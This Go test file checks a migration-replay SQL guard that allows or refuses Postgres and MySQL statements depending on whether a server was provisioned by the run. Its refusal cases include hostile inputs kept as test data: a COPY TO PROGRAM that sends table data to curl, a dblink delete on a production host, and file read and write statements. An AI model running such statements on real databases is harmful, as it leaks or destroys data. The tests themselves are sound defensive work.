package devclean_test

import (
	"testing"

	qt "github.com/frankban/quicktest"

	"ptah.run/catalog"
	"ptah.run/core/platform"
	"ptah.run/internal/devclean"
)

// postgresServerWideStatements are refused on a server the operator named and
// accepted on one the run provisioned. Each reaches past the dev database into
// the rest of the server, and on a provisioned server the rest of the server is
// the run's own.
var postgresServerWideStatements = []struct {
	name      string
	statement string
}{
	{name: "DO block creating a role", statement: "DO $$\nBEGIN\n  IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'app') THEN\n    CREATE ROLE app NOLOGIN;\n  END IF;\nEND\n$$"},
	{name: "CALL", statement: `CALL refresh_totals()`},
	{name: "CREATE FUNCTION", statement: `CREATE FUNCTION add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`},
	{name: "CREATE OR REPLACE FUNCTION", statement: `CREATE OR REPLACE FUNCTION add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`},
	{name: "CREATE PROCEDURE", statement: `CREATE PROCEDURE refresh_totals() LANGUAGE sql AS $$ SELECT 1 $$`},
	{name: "ALTER FUNCTION", statement: `ALTER FUNCTION add_one(integer) SECURITY DEFINER`},
	{name: "CREATE ROLE", statement: `CREATE ROLE app NOLOGIN NOSUPERUSER NOBYPASSRLS`},
	{name: "CREATE USER", statement: `CREATE USER reporter`},
	{name: "CREATE GROUP", statement: `CREATE GROUP readers`},
	{name: "ALTER ROLE attributes", statement: `ALTER ROLE app WITH LOGIN`},
	{name: "DROP ROLE", statement: `DROP ROLE IF EXISTS app`},
	{name: "CREATE DATABASE", statement: `CREATE DATABASE scratch`},
	{name: "role membership", statement: `GRANT app TO reporter`},
	{name: "schema privilege", statement: `GRANT USAGE ON SCHEMA public TO app`},
	{name: "database privilege", statement: `GRANT CONNECT ON DATABASE dev TO app`},
	{name: "revoked schema privilege", statement: `REVOKE ALL ON SCHEMA public FROM PUBLIC`},
	{name: "default privileges without a schema", statement: `ALTER DEFAULT PRIVILEGES GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app`},
	{name: "DROP OWNED", statement: `DROP OWNED BY app`},
	{name: "REASSIGN OWNED", statement: `REASSIGN OWNED BY app TO reporter`},
	{name: "COMMENT ON ROLE", statement: `COMMENT ON ROLE app IS 'the application role'`},
}

func postgresGuard(realm devclean.ReplayRealm) *devclean.ReplayGuard {
	return devclean.NewReplayGuard(catalog.ServerInfo{Dialect: platform.Postgres, Schema: "public"}, realm)
}

func TestReplayGuardServerRealm_PostgresLiftsServerWideStatements(t *testing.T) {
	guard := postgresGuard(devclean.ReplayRealmServer)
	for _, test := range postgresServerWideStatements {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			c.Assert(guard.ValidateStatement(test.statement), qt.IsNil)
		})
	}
}

// TestReplayGuardDatabaseRealm_PostgresRefusesServerWideStatements is the
// control for the test above: the same statements are refused on a server the
// operator named, so the realm is what lifted them.
func TestReplayGuardDatabaseRealm_PostgresRefusesServerWideStatements(t *testing.T) {
	guard := postgresGuard(devclean.ReplayRealmDatabase)
	for _, test := range postgresServerWideStatements {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			c.Assert(
				guard.ValidateStatement(test.statement),
				qt.ErrorMatches,
				`postgres migration replay rejects .* because its effects cannot be confined to the disposable database realm`,
			)
		})
	}
}

// TestReplayGuardServerRealm_PostgresFailurePath pins what a provisioned server
// still refuses. None of these is refused for the realm: each changes the
// replay session or the sessions the rest of the run opens, changes how the
// run's later SQL parses or runs, reaches past the container, or mutates the
// server's own catalogs.
func TestReplayGuardServerRealm_PostgresFailurePath(t *testing.T) {
	guard := postgresGuard(devclean.ReplayRealmServer)
	tests := []struct {
		name      string
		statement string
		wantErr   string
	}{
		{name: "role session default", statement: `ALTER ROLE app SET search_path TO app`, wantErr: `.*rejects ALTER ROLE .*`},
		{name: "role reset", statement: `ALTER ROLE ALL RESET ALL`, wantErr: `.*rejects ALTER ROLE .*`},
		{name: "database setting", statement: `ALTER DATABASE dev SET search_path TO app`, wantErr: `.*rejects ALTER DATABASE .*`},
		{name: "database rename", statement: `ALTER DATABASE dev RENAME TO other`, wantErr: `.*rejects ALTER DATABASE .*`},
		{name: "server configuration", statement: `ALTER SYSTEM SET work_mem = '64MB'`, wantErr: `.*rejects ALTER SYSTEM .*`},
		{name: "event trigger", statement: `CREATE EVENT TRIGGER audit ON ddl_command_end EXECUTE FUNCTION audit_ddl()`, wantErr: `.*rejects CREATE EVENT .*`},
		{name: "language", statement: `CREATE LANGUAGE plpython3u`, wantErr: `.*rejects CREATE LANGUAGE .*`},
		{name: "cast", statement: `CREATE CAST (text AS integer) WITH INOUT`, wantErr: `.*rejects CREATE CAST .*`},
		{name: "tablespace", statement: `CREATE TABLESPACE fast LOCATION '/mnt/fast'`, wantErr: `.*rejects CREATE TABLESPACE .*`},
		{name: "tablespace privilege", statement: `GRANT CREATE ON TABLESPACE fast TO app`, wantErr: `.*rejects GRANT database or global privilege .*`},
		{name: "subscription", statement: `CREATE SUBSCRIPTION sub CONNECTION 'host=prod' PUBLICATION pub`, wantErr: `.*rejects CREATE SUBSCRIPTION .*`},
		{name: "foreign server", statement: `CREATE SERVER prod FOREIGN DATA WRAPPER postgres_fdw`, wantErr: `.*rejects CREATE SERVER .*`},
		{name: "user mapping", statement: `CREATE USER MAPPING FOR app SERVER prod`, wantErr: `.*rejects CREATE USER because .*`},
		{name: "foreign schema import", statement: `IMPORT FOREIGN SCHEMA public FROM SERVER prod INTO staging`, wantErr: `.*rejects IMPORT FOREIGN SCHEMA .*`},
		{name: "dblink", statement: `SELECT dblink_exec('host=prod', 'DELETE FROM orders')`, wantErr: `.*rejects external dblink operation .*`},
		{name: "copy to a program", statement: `COPY orders TO PROGRAM 'curl -d @- https://example.test'`, wantErr: `.*rejects external COPY .*`},
		{name: "cluster control function", statement: `SELECT pg_terminate_backend(42)`, wantErr: `.*rejects cluster control function .*`},
		{name: "search path", statement: `SET search_path TO app`, wantErr: `.*rejects SET search_path .*`},
		{name: "transaction control", statement: `COMMIT`, wantErr: `.*rejects COMMIT session or transaction state .*`},
		{name: "temporary table", statement: `CREATE TEMP TABLE scratch (id integer)`, wantErr: `.*rejects TEMP object .*`},
		{name: "routine in a protected namespace", statement: `CREATE FUNCTION pg_catalog.add_one(i integer) RETURNS integer LANGUAGE sql AS $$ SELECT i + 1 $$`, wantErr: `.*rejects protected namespace "pg_catalog" mutation .*`},
		{name: "privilege on a protected schema", statement: `GRANT USAGE ON SCHEMA pg_catalog TO app`, wantErr: `.*rejects protected namespace "pg_catalog" mutation .*`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			c := qt.New(t)
			c.Assert(guard.ValidateStatement(test.statement), qt.ErrorMatches, test.wantErr)
		})
	}
}

// mysqlServerWideStatements are the MySQL and MariaDB counterpart of
// postgresServerWideStatements.
var mysqlServerWideStatements = []struct {
	name      string
	statement string
}{
	{name: "CREATE PROCEDURE", statement: "CREATE PROCEDURE refresh_totals() BEGIN SELECT 1; END"},
	{name: "CREATE FUNCTION with a definer", statement: "CREATE DEFINER = `root`@`%` FUNCTION add_one(i INT) RETURNS INT DETERMINISTIC RETURN i + 1"},
	{name: "CREATE TRIGGER", statement: "CREATE TRIGGER orders_touch BEFORE UPDATE ON orders FOR EACH ROW SET NEW.updated_at = NOW()"},
	{name: "ALTER PROCEDURE", statement: "ALTER PROCEDURE refresh_totals COMMENT 'nightly'"},
	{name: "CALL", statement: "CALL refresh_totals()"},
	{name: "CREATE USER", statement: "CREATE USER 'app'@'%' IDENTIFIED BY 'secret'"},
	{name: "DROP USER", statement: "DROP USER IF EXISTS 'app'@'%'"},
	{name: "CREATE ROLE", statement: "CREATE ROLE 'readers'"},
	{name: "GRANT", statement: "GRANT SELECT ON dev.* TO 'app'@'%'"},
	{name: "REVOKE", statement: "REVOKE INSERT ON dev.orders FROM 'app'@'%'"},
	{name: "CREATE DATABASE", statement: "CREATE DATABASE IF NOT EXISTS archive"},
	{name: "write in another database", statement: "CREATE TABLE archive.orders (id INT PRIMARY KEY)"},
}

func mysqlGuard(dialect string, realm devclean.ReplayRealm) *devclean.ReplayGuard {
	return devclean.NewReplayGuard(catalog.ServerInfo{Dialect: dialect, Schema: "dev"}, realm)
}

func TestReplayGuardServerRealm_MySQLLiftsServerWideStatements(t *testing.T) {
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		guard := mysqlGuard(dialect, devclean.ReplayRealmServer)
		for _, test := range mysqlServerWideStatements {
			t.Run(dialect+"/"+test.name, func(t *testing.T) {
				c := qt.New(t)
				c.Assert(guard.ValidateStatement(test.statement), qt.IsNil)
			})
		}
	}
}

// TestReplayGuardDatabaseRealm_MySQLRefusesServerWideStatements is the control
// for the test above.
func TestReplayGuardDatabaseRealm_MySQLRefusesServerWideStatements(t *testing.T) {
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		guard := mysqlGuard(dialect, devclean.ReplayRealmDatabase)
		for _, test := range mysqlServerWideStatements {
			t.Run(dialect+"/"+test.name, func(t *testing.T) {
				c := qt.New(t)
				c.Assert(
					guard.ValidateStatement(test.statement),
					qt.ErrorMatches,
					dialect+` migration replay rejects .* because its effects cannot be confined to the disposable database realm`,
				)
			})
		}
	}
}

// TestReplayGuardServerRealm_MySQLFailurePath pins what a provisioned MySQL or
// MariaDB server still refuses: a scheduled event runs during the rest of the
// run, and the others change the session, the server's configuration or the
// run's own credentials, or reach past the container.
func TestReplayGuardServerRealm_MySQLFailurePath(t *testing.T) {
	tests := []struct {
		name      string
		statement string
		wantErr   string
	}{
		{name: "scheduled event", statement: "CREATE EVENT purge ON SCHEDULE EVERY 1 MINUTE DO DELETE FROM orders", wantErr: `.*rejects CREATE executable stored body .*`},
		{name: "event with a definer", statement: "CREATE DEFINER = `root`@`%` EVENT purge ON SCHEDULE EVERY 1 MINUTE DO DELETE FROM orders", wantErr: `.*rejects CREATE executable stored body .*`},
		{name: "credential change", statement: "ALTER USER 'root'@'%' IDENTIFIED BY 'changed'", wantErr: `.*rejects ALTER USER .*`},
		{name: "session database", statement: "USE archive", wantErr: `.*rejects USE .*`},
		{name: "global setting", statement: "SET GLOBAL max_connections = 10", wantErr: `.*rejects global or persistent SET .*`},
		{name: "external data load", statement: "LOAD DATA INFILE '/tmp/orders.csv' INTO TABLE orders", wantErr: `.*rejects LOAD external data operation .*`},
		{name: "external file write", statement: "SELECT * FROM orders INTO OUTFILE '/tmp/orders.csv'", wantErr: `.*rejects external file operation .*`},
		{name: "federated table", statement: "CREATE TABLE remote_orders (id INT) ENGINE=FEDERATED CONNECTION='mysql://prod/orders'", wantErr: `.*rejects FEDERATED storage engine .*`},
		{name: "temporary table", statement: "CREATE TEMPORARY TABLE scratch (id INT)", wantErr: `.*rejects TEMP object .*`},
		{name: "executable comment", statement: "/*!50000 CREATE USER 'app'@'%' */", wantErr: `.*rejects executable comment .*`},
	}
	for _, dialect := range []string{platform.MySQL, platform.MariaDB} {
		guard := mysqlGuard(dialect, devclean.ReplayRealmServer)
		for _, test := range tests {
			t.Run(dialect+"/"+test.name, func(t *testing.T) {
				c := qt.New(t)
				c.Assert(guard.ValidateStatement(test.statement), qt.ErrorMatches, test.wantErr)
			})
		}
	}
}
